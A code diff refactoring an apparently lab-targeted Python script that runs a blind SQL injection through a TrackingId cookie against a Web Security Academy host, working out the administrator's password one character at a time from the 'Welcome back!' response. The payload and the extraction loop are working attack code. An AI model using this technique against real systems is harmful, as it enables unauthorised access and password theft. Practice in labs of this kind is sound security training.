@@ -30,10 +30,12 @@ passwd = ""
 while (i < len(chars)):
     
     # Set the malicious cookie w SQLi payload prior to sending.
+    vuln_cookie = "uOIasdfQgi' UNION SELECT 'a' FROM USERS WHERE username = 'administrator' AND SUBSTRING(password, {}, 1) = '{}' --"
     jar.set(
         'TrackingId', 
-        "uOIasdfQgi' UNION SELECT 'a' FROM USERS WHERE username = 'administrator' AND SUBSTRING(password, " + str(passindex) + ", 1) = '" + str(chars[i]) + "' --", 
-        domain='web-security-academy.net')
+        vuln_cookie.format(str(passindex), str(chars[i])), 
+        domain='web-security-academy.net'
+    )
 
     r = requests.get(url, cookies=jar)
     #DEBUG print(jar.items())
@@ -42,7 +44,7 @@ while (i < len(chars)):
     # for the stated position in the password.
     match = re.search("Welcome back!", r.text)
     if (match): 
-        print("Password character: " + chars[i])
+        print("Password character: {}".format(chars[i]))
         passwd += chars[i] 
         i = -1
         passindex += 1
